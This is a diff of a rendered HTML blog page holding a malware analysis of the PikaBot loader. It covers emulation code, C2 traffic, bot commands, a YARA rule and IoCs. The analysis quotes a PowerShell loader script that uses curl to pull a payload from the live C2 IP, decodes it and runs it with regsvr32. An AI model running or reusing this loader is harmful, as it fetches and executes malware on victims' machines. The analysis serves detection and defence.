         alt="/pikabot/PikaBot%20285a6e968ebc46e98b1ca9d4ef094316/Untitled%2011.png"
         title="Untitled" width="361" height="658" /></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">qiling</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">qiling</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">qiling.const</span> <span class="kn">import</span> <span class="n">QL_VERBOSE</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">argv</span> <span class="o">=</span> <span class="p">[</span><span class="sa">r</span><span class="s2">&#34;qiling</span><span class="se">\\</span><span class="s2">examples</span><span class="se">\\</span><span class="s2">rootfs</span><span class="se">\\</span><span class="s2">x86_windows</span><span class="se">\\</span><span class="s2">Windows</span><span class="se">\\</span><span class="s2">bin</span><span class="se">\\</span><span class="s2">pika.dll&#34;</span><span class="p">]</span>
@@ -833,10 +703,8 @@ Then, it is called <code>GetThreadContext</code> passing reused allocated memory
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">ql</span><span class="o">.</span><span class="n">emu_start</span><span class="p">(</span><span class="n">begin</span><span class="o">=</span><span class="mh">0x10011A5E</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="mh">0x100121DF</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">ql</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">ql</span><span class="o">.</span><span class="n">arch</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">ebp</span> <span class="o">-</span> <span class="mh">0x4c</span> <span class="p">,</span><span class="mh">0x14</span><span class="p">))</span>
-</span></span><span class="line"><span class="cl"><span class="n">ql</span><span class="o">.</span><span class="n">emu_stop</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>The output</strong></p>
+</span></span><span class="line"><span class="cl"><span class="n">ql</span><span class="o">.</span><span class="n">emu_stop</span><span class="p">()</span></span></span></code></pre></div></div>
+<p><strong>The output</strong></p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -910,15 +778,13 @@ The same API dynamic resolving function (<em>sub_100036BA</em>) is used but more
         title="Untitled" width="601" height="47" /></li>
 </ul>
 <p>The malware then checks the command execution functionality using a command that vary across the samples.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cmd.exe /C <span class="s2">&#34;ping localhost &amp;&amp; copy /b /y %s\\%s %s\\%s&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>passing this wide string to <code>wsprintfW</code> function with only one string <code>%SystemRoot%</code> -This could lead to unexpected behavior; it could raise access violation exception or just continue and only the first placeholder replaced. - The output is then executed using <code>CreateProcessW</code> and the return value is checked to determine the function&rsquo;s return value, if it is 0, return 0 if not, it will call <code>CloseHandle()</code> twice:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cmd.exe /C <span class="s2">&#34;ping localhost &amp;&amp; copy /b /y %s\\%s %s\\%s&#34;</span></span></span></code></pre></div></div>
+<p>passing this wide string to <code>wsprintfW</code> function with only one string <code>%SystemRoot%</code> -This could lead to unexpected behavior; it could raise access violation exception or just continue and only the first placeholder replaced. - The output is then executed using <code>CreateProcessW</code> and the return value is checked to determine the function&rsquo;s return value, if it is 0, return 0 if not, it will call <code>CloseHandle()</code> twice:</p>
 <ul>
 <li>The first with a valid handle to close the process created.</li>
 <li>the second with invalid handle = 0, will return 0 -or should be 0 in normal systems, this could be anti-sandbox/emulation not sure as the function&rsquo;s return value is not used-.</li>
@@ -967,28 +833,12 @@ The information collection process is done as follows (<code>sub_1000241E</code>
 <li>Get <code>domain_controller_name</code> by calling <code>DsGetDcNameW</code> API or return <code>unknown</code> if not available.
 Each data item fills its location by calling <code>wsprintfW</code> function so, it will become like the following but with the victim collected data.</li>
 </ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="s2">&#34;{&#34;</span><span class="err">uuid</span><span class="s2">&#34;: &#34;</span><span class="err">uuid</span><span class="s2">&#34;,
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="s2">&#34;{&#34;</span><span class="err">uuid</span><span class="s2">&#34;: &#34;</span><span class="err">uuid</span><span class="s2">&#34;,
 </span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="err">stream</span><span class="s2">&#34;: &#34;</span><span class="err">bb_d</span><span class="mi">2</span><span class="err">@T@dd</span><span class="mi">48940</span><span class="err">b</span><span class="mi">389148069</span><span class="err">ffc</span><span class="mi">1</span><span class="err">db</span><span class="mi">3</span><span class="err">f</span><span class="mi">2</span><span class="err">f</span><span class="mi">38</span><span class="err">c</span><span class="mi">0</span><span class="err">e</span><span class="s2">&#34;,
 </span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">os_version</span><span class="s2">&#34;: &#34;</span><span class="err">OS</span> <span class="err">version</span> <span class="err">and</span> <span class="err">build</span> <span class="err">number</span><span class="s2">&#34;,
 </span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">product_number</span><span class="s2">&#34;: ,
@@ -1004,70 +854,58 @@ Each data item fills its location by calling <code>wsprintfW</code> function so,
 </span></span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="err">av_software</span><span class="s2">&#34;: &#34;</span><span class="err">unknown</span><span class="s2">&#34;,
 </span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">domain_name</span><span class="s2">&#34;: &#34;&#34;,
 </span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">domain_controller_name</span><span class="s2">&#34;: &#34;</span><span class="err">unknown</span><span class="s2">&#34;,
-</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">domain_controller_address</span><span class="s2">&#34;: &#34;</span><span class="err">unknown</span><span class="s2">&#34;}&#34;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="c2-server-communication">C2 server communication</h3>
+</span></span></span><span class="line"><span class="cl"><span class="s2"> &#34;</span><span class="err">domain_controller_address</span><span class="s2">&#34;: &#34;</span><span class="err">unknown</span><span class="s2">&#34;}&#34;</span></span></span></code></pre></div></div>
+<h3 id="c2-server-communication">C2 server communication</h3>
 <p>The data collected is encoded using standard Base64 then encrypted using AES using the first 32-byte as the key and the first 16-byte of the key as the IV. then the data decoded with Base64 and sent to C2 server IP = <code>37.1.215.220</code> using <em>POST</em> request to the subdirectory <code>messages/INJtv97YfpOzznVMY</code>. The response is decoded in the same way too. The initial beacon contains <code>user_id=Him3xrn9e&amp;team_id=JqLtxw1h</code> hardcoded string added to IP parameters.
 The request header is included in the binary as follows:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded\\r\\n
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded\\r\\n
 </span></span><span class="line"><span class="cl">Accept: */*\\r\\n
 </span></span><span class="line"><span class="cl">Accept-Language: en-US,en;q=0.5\\r\\n
 </span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate\\r\\n
-</span></span><span class="line"><span class="cl">User-Agent: %s\\r\\n
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>The <code>User-Agent</code> is also in the binary, and it is:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>The response of the initial sent packet (knock) contains some commands to be executed on the victim machine:</p>
+</span></span><span class="line"><span class="cl">User-Agent: %s\\r\\n</span></span></code></pre></div></div>
+<p>The <code>User-Agent</code> is also in the binary, and it is:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)</span></span></code></pre></div></div>
+<p>The response of the initial sent packet (knock) contains some commands to be executed on the victim machine:</p>
 <table>
-<thead>
-<tr>
-<th>Response</th>
-<th>command</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>whoami</td>
-<td>execute whoami /all command</td>
-</tr>
-<tr>
-<td>ipconfig</td>
-<td>execute ipconfig /all command</td>
-</tr>
-<tr>
-<td>screenshoot</td>
-<td>take a snapshot of all the running processes of the victim machine using CreateToolhel32Snashot, Process32FirstW and Process32NextW</td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>Response</th>
+          <th>command</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>whoami</td>
+          <td>execute whoami /all command</td>
+      </tr>
+      <tr>
+          <td>ipconfig</td>
+          <td>execute ipconfig /all command</td>
+      </tr>
+      <tr>
+          <td>screenshoot</td>
+          <td>take a snapshot of all the running processes of the victim machine using CreateToolhel32Snashot, Process32FirstW and Process32NextW</td>
+      </tr>
+  </tbody>
 </table>
 <p>The data requested decoded in the following form to be sent to the attacker but to different subdirectory <code>messages/ADXDAG6</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> <span class="nt">&#34;uuid&#34;</span><span class="p">:</span> <span class="s2">&#34;%s&#34;</span><span class="p">,</span> <span class="nt">&#34;additional_type&#34;</span><span class="p">:</span> <span class="s2">&#34;%s&#34;</span><span class="p">,</span> <span class="nt">&#34;data&#34;</span><span class="p">:</span> <span class="s2">&#34; &#34;</span> <span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>How The Command are executed</strong>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span> <span class="nt">&#34;uuid&#34;</span><span class="p">:</span> <span class="s2">&#34;%s&#34;</span><span class="p">,</span> <span class="nt">&#34;additional_type&#34;</span><span class="p">:</span> <span class="s2">&#34;%s&#34;</span><span class="p">,</span> <span class="nt">&#34;data&#34;</span><span class="p">:</span> <span class="s2">&#34; &#34;</span> <span class="p">}</span></span></span></code></pre></div></div>
+<p><strong>How The Command are executed</strong>
 The malware add <code>%SystemRoot%\\SysWoW64\\cmd.exe</code> to the user environment variables and creates a pipe for covert communication and receiving the output. To get the output is uses the named pipe in <code>PeekNamedPipe</code> in an infinite loop and the break condition is when <code>WaitForSingleObject</code> sense an object state changing.</p>
 <h3 id="c2-commands">C2 commands</h3>
 <p>The Malware contains some other commands to do but not all of them are implemented yet.</p>
@@ -1084,27 +922,23 @@ The malware add <code>%SystemRoot%\\SysWoW64\\cmd.exe</code> to the user environ
 <p>The output of the commands is sent to another subdirectory <code>messages/TRCsUVyMigZyuUQ</code> with the same encoding schema followed before. The commands are the following:</p>
 <p><strong>knock timeout</strong>
 Seems to be not fully implemented but from the current state, it sends <code>Knock Timeout Changed!</code> to the server in the following JSON. It&rsquo;s used to delay any code execution on the victim machine.</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> {&#34;uuid&#34;: &#34;%s&#34;, &#34;task_id&#34;: %s, &#34;execution_code&#34;: %d, &#34;data&#34;: &#34;
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>additional</strong>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> {&#34;uuid&#34;: &#34;%s&#34;, &#34;task_id&#34;: %s, &#34;execution_code&#34;: %d, &#34;data&#34;: &#34;</span></span></code></pre></div></div>
+<p><strong>additional</strong>
 Nothing new here, it has the same <code>whoami</code>, <code>ipconfig</code> and <code>screenshoot</code> commands explained before.</p>
 <p><strong>dll (exe)</strong>
 Download another DLL or exe file and run it using Process injection technique. The bot responds with the following with the state of downloading process (in case of failure <code>Download Failed!</code>) and the state of the injection process (<code>Injection Success!</code> or <code>Injection Failed!</code>) but to another subdirectory <code>messages/DPVHLqEWR4uBk</code></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;uuid&#34;: &#34;%s&#34;, &#34;file_hash&#34;: &#34;%s&#34;, &#34;task_id&#34;: %s}
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>shellcode</strong>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{&#34;uuid&#34;: &#34;%s&#34;, &#34;file_hash&#34;: &#34;%s&#34;, &#34;task_id&#34;: %s}</span></span></code></pre></div></div>
+<p><strong>shellcode</strong>
 Download a shellcode and run by injecting it in a target process. Same as the DLL case</p>
 <p><strong>cmd</strong>
 Execute cmd commands on the target machine. It runs the command with the same method explained previously.</p>
@@ -1114,58 +948,25 @@ Execute cmd commands on the target machine. It runs the command with the same me
 <p><a href="https://bazaar.abuse.ch/sample/67c61f649ec276eb57fcfe70dbd6e33b4c05440ee10356a3ef10fad9d0e224ef/" target="_blank" rel="noopener noreffer ">sample</a>
 There are some other variants of the malware loader contains PowerShell script encrypted and stored on the <code>.rdata</code> section and it used to start the downloaded DLL using <code>regsvr32</code>
 the following example script from <a href="https://research.openanalysis.net/pikabot/yara/config/loader/2023/02/26/pikabot.html" target="_blank" rel="noopener noreffer ">OALABS Blog</a></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$nonresistantOutlivesDictatorial</span> <span class="p">=</span> <span class="s2">&#34;$env:APPDATA\\Microsoft\\nonresistantOutlivesDictatorial\\AphroniaHaimavati.dll&#34;</span><span class="p">;</span>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$nonresistantOutlivesDictatorial</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="nv">$env:APPDATA</span><span class="s2">\\Microsoft\\nonresistantOutlivesDictatorial\\AphroniaHaimavati.dll&#34;</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="nb">md </span><span class="nv">$env:APPDATA</span><span class="p">\\</span><span class="n">Microsoft</span><span class="p">\\</span><span class="n">nonresistantOutlivesDictatorial</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="p">(</span><span class="nb">Get-Command</span> <span class="n">curl</span><span class="p">.</span><span class="n">exe</span><span class="p">).</span><span class="n">Source</span> <span class="n">-NoNewWindow</span> <span class="n">-ArgumentList</span> <span class="s1">&#39;--url &lt;https://37.1.215.220/messages/DBcB6q9SM6&gt; -X POST --insecure --output &#39;</span><span class="p">,</span> <span class="nv">$nonresistantOutlivesDictatorial</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Start-Sleep</span> <span class="n">-Seconds</span> <span class="n">40</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="nv">$ungiantDwarfest</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="nv">$env:APPDATA</span><span class="p">\\</span><span class="n">Microsoft</span><span class="p">\\</span><span class="n">nonresistantOutlivesDictatorial</span><span class="p">\\</span><span class="n">AphroniaHaimavati</span><span class="p">.</span><span class="n">dll</span> <span class="p">|</span> <span class="p">%{</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$_</span><span class="p">)};</span>
-</span></span><span class="line"><span class="cl"><span class="nb">Set-Content</span> <span class="nv">$env:APPDATA</span><span class="p">\\</span><span class="n">Microsoft</span><span class="p">\\</span><span class="n">nonresistantOutlivesDictatorial</span><span class="p">\\</span><span class="n">AphroniaHaimavati</span><span class="p">.</span><span class="n">dll</span> <span class="n">-Value</span> <span class="nv">$ungiantDwarfest</span> <span class="n">-Encoding</span> <span class="n">Byte</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="n">regsvr32</span> <span class="p">/</span><span class="n">s</span> <span class="nv">$env:APPDATA</span><span class="p">\\</span><span class="n">Microsoft</span><span class="p">\\</span><span class="n">nonresistantOutlivesDictatorial</span><span class="p">\\</span><span class="n">AphroniaHaimavati</span><span class="p">.</span><span class="n">dll</span><span class="p">;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="yara-rule">Yara Rule</h2>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Start-Process</span> <span class="p">(</span><span class="nb">Get-Command</span> <span class="n">curl</span><span class="p">.</span><span class="n">exe</span><span class="p">).</span><span class="py">Source</span> <span class="n">-NoNewWindow</span> <span class="n">-ArgumentList</span> <span class="s1">&#39;--url &lt;https://37.1.215.220/messages/DBcB6q9SM6&gt; -X POST --insecure --output &#39;</span><span class="p">,</span> <span class="nv">$nonresistantOutlivesDictatorial</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Start-Sleep</span> <span class="n">-Seconds</span> <span class="mf">40</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$ungiantDwarfest</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="nv">$env:APPDATA</span><span class="p">\\</span><span class="n">Microsoft</span><span class="p">\\</span><span class="n">nonresistantOutlivesDictatorial</span><span class="p">\\</span><span class="n">AphroniaHaimavati</span><span class="p">.</span><span class="py">dll</span> <span class="p">|</span> <span class="p">%{[</span><span class="no">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$_</span><span class="p">)};</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Set-Content</span> <span class="nv">$env:APPDATA</span><span class="p">\\</span><span class="n">Microsoft</span><span class="p">\\</span><span class="n">nonresistantOutlivesDictatorial</span><span class="p">\\</span><span class="n">AphroniaHaimavati</span><span class="p">.</span><span class="py">dll</span> <span class="n">-Value</span> <span class="nv">$ungiantDwarfest</span> <span class="n">-Encoding</span> <span class="n">Byte</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">regsvr32</span> <span class="p">/</span><span class="n">s</span> <span class="nv">$env:APPDATA</span><span class="p">\\</span><span class="n">Microsoft</span><span class="p">\\</span><span class="n">nonresistantOutlivesDictatorial</span><span class="p">\\</span><span class="n">AphroniaHaimavati</span><span class="p">.</span><span class="n">dll</span><span class="p">;</span></span></span></code></pre></div></div>
+<h2 id="yara-rule">Yara Rule</h2>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">rule</span> <span class="n">pikabot</span><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="n">meta</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">malware</span> <span class="o">=</span> <span class="s2">&#34;Pikabot&#34;</span>
@@ -1190,39 +991,37 @@ the following example script from <a href="https://research.openanalysis.net/pik
 </span></span><span class="line"><span class="cl">        <span class="n">uint16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x5A4D</span>
 </span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="p">(</span><span class="n">uint32</span><span class="p">(</span><span class="n">uint32</span><span class="p">(</span><span class="mh">0x3C</span><span class="p">))</span> <span class="o">==</span> <span class="mh">0x00004550</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="ow">and</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">them</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="iocs">IoCs</h2>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<h2 id="iocs">IoCs</h2>
 <table>
-<thead>
-<tr>
-<th>IoC</th>
-<th>description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>dff2122bb516f71675f766cc1dd87c07ce3c985f98607c25e53dcca87239c5f6</td>
-<td>packed loader</td>
-</tr>
-<tr>
-<td>2411b23bab7703e94897573f3758e1849fdc6f407ea1d1e5da20a4e07ecf3c09</td>
-<td>unpacked loader</td>
-</tr>
-<tr>
-<td>59f42ecde152f78731e54ea27e761bba748c9309a6ad1c2fd17f0e8b90f8aed1</td>
-<td>unpacked loader</td>
-</tr>
-<tr>
-<td>37.1.215[.]220</td>
-<td>C2 Server IP</td>
-</tr>
-<tr>
-<td>{99C10657-633C-4165-9D0A-082238CB9FE0}</td>
-<td>mutex value</td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>IoC</th>
+          <th>description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>dff2122bb516f71675f766cc1dd87c07ce3c985f98607c25e53dcca87239c5f6</td>
+          <td>packed loader</td>
+      </tr>
+      <tr>
+          <td>2411b23bab7703e94897573f3758e1849fdc6f407ea1d1e5da20a4e07ecf3c09</td>
+          <td>unpacked loader</td>
+      </tr>
+      <tr>
+          <td>59f42ecde152f78731e54ea27e761bba748c9309a6ad1c2fd17f0e8b90f8aed1</td>
+          <td>unpacked loader</td>
+      </tr>
+      <tr>
+          <td>37.1.215[.]220</td>
+          <td>C2 Server IP</td>
+      </tr>
+      <tr>
+          <td>{99C10657-633C-4165-9D0A-082238CB9FE0}</td>
+          <td>mutex value</td>
+      </tr>
+  </tbody>
 </table>
 <h2 id="references">References</h2>
 <ul>
@@ -1238,40 +1037,42 @@ the following example script from <a href="https://research.openanalysis.net/pik
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on 2023-08-01&nbsp;<a class="git-hash" href="https://github.com/dillonzq/LoveIt/commit/6c4e2676970a2f44ae50837246b8210a4429abe9" target="_blank" title="commit by mohamedadel46(muhammed195826@feng.bu.edu.eg) 6c4e2676970a2f44ae50837246b8210a4429abe9: update pikabot yara rule">
-                                    <i class="fas fa-hashtag fa-fw" aria-hidden="true"></i>6c4e267</a></span>
+                <span>Updated on 2023-08-01</span>
             </div></div>
         <div class="post-info-line">
             <div class="post-info-md"><span>
